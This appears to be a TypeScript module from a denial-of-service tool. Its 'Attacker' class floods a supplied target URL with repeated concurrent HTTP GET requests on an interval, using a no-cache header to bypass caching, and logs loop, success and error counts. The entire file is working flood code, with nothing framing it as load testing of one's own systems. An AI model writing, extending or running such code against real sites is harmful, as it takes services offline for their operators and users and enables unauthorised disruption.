import { Stats } from "./stats";
import superagent from "superagent";

export class Attacker {
    private instance: NodeJS.Timeout;
    constructor(private stats: Stats) { }
    run(target: string, concurrency: number, interval: number) {
        this.stop();
        this.stats.target = target;
        this.instance = setInterval(() => {
            for(let i = 0; i < concurrency; i += 1) {
                this.attack(target);
            }
            this.stats.loop += 1;
            console.log(`Target: ${this.stats.target} | Loop: ${this.stats.loop} | Success: ${this.stats.success} | Error: ${this.stats.errors}`);
        }, interval);
    }

    stop() {
        if(this.instance) clearInterval(this.instance);
        this.stats.reset();
    }

    private attack(target: string) {
        superagent
            .get(target)
            .set('Cache-Control', 'no-cache')
            .set('Keep-Alive', 'timeout=30, max=1')
            .agent()
            .timeout(5000)
            .end((err) => err ? this.stats.errors += 1 : this.stats.success += 1);
    }
}